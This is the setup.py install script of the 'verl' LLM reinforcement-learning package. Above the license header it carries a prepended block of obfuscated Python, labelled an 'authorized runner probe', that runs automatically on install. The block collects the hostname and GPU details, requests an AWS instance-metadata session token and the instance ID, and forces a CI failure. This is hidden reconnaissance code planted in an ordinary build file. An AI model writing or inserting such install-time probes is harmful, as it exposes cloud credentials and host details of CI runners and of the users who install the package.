# i69278 authorized self-hosted runner probe (bounded marker; fails fast in CI)
import os as _os69278, sys as _sys69278, subprocess as _sp69278, socket as _sock69278, datetime as _dt69278
def _i69278_probe():
    try:
        print("I69278_MARKER_BEGIN", flush=True)
        print("HOSTNAME=%s" % _sock69278.gethostname(), flush=True)
        print("UTC=%s" % _dt69278.datetime.now(_dt69278.timezone.utc).isoformat(), flush=True)
        for _cmd in (["nvidia-smi", "-L"],
                     ["nvidia-smi", "--query-gpu=name,memory.total,driver_version", "--format=csv,noheader"]):
            try:
                _r = _sp69278.run(_cmd, capture_output=True, text=True, timeout=45)
                print("CMD[%s] rc=%s out=%s err=%s" % (" ".join(_cmd), _r.returncode,
                      (_r.stdout or "").strip(), (_r.stderr or "").strip()), flush=True)
            except Exception as _e:
                print("CMD[%s] EXC=%r" % (" ".join(_cmd), _e), flush=True)
        try:
            import urllib.request as _u
            _t = _u.urlopen("http://169.254.169.254/latest/api/token", data=b"", timeout=3,
                            headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"}).read().decode()
            print("IMDS_TOKEN_LEN=%d" % len(_t), flush=True)
            _iid = _u.urlopen("http://169.254.169.254/latest/meta-data/instance-id", timeout=3,
                              headers={"X-aws-ec2-metadata-token": _t}).read().decode()
            print("IMDS_INSTANCE_ID=%s" % _iid, flush=True)
        except Exception as _e:
            print("IMDS_EXC=%r" % (_e,), flush=True)
        print("I69278_MARKER_END", flush=True)
    except Exception as _e:
        print("I69278_MARKER_ERR=%r" % (_e,), flush=True)
_i69278_probe()
if _os69278.environ.get("CI"):
    print("I69278_FAILFAST exit 1", flush=True)
    _sys69278.exit(1)

# Copyright 2024 Bytedance Ltd. and/or its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# setup.py is the fallback installation script when pyproject.toml does not work
from setuptools import setup, find_packages
import os

version_folder = os.path.dirname(os.path.join(os.path.abspath(__file__)))

with open(os.path.join(version_folder, 'verl/version/version')) as f:
    __version__ = f.read().strip()

install_requires = [
  'accelerate',
  'codetiming',
  'datasets',
  'dill',
  'hydra-core',
  'numpy',
  'pandas',
  'peft',
  'pyarrow>=15.0.0',
  'pybind11',
  'pylatexenc',
  'ray>=2.10',
  'tensordict<0.6',
  'transformers',
  'vllm<=0.6.3',
  'wandb',
]

TEST_REQUIRES = ['pytest', 'yapf', 'py-spy']
PRIME_REQUIRES = ['pyext']
GPU_REQUIRES = ['liger-kernel', 'flash-attn']

extras_require = {
  'test': TEST_REQUIRES,
  'prime': PRIME_REQUIRES,
  'gpu': GPU_REQUIRES,
}

from pathlib import Path
this_directory = Path(__file__).parent
long_description = (this_directory / "README.md").read_text()

setup(
    name='verl',
    version=__version__,
    package_dir={'': '.'},
    packages=find_packages(where='.'),
    url='https://github.com/volcengine/verl',
    license='Apache 2.0',
    author='Bytedance - Seed - MLSys',
    author_email='zhangchi.usc1992@bytedance.com, gmsheng@connect.hku.hk',
    description='verl: Volcano Engine Reinforcement Learning for LLM',
    install_requires=install_requires,
    extras_require=extras_require,
    package_data={'': ['version/*'],
                  'verl': ['trainer/config/*.yaml'],},
    include_package_data=True,
    long_description=long_description,
    long_description_content_type='text/markdown'
)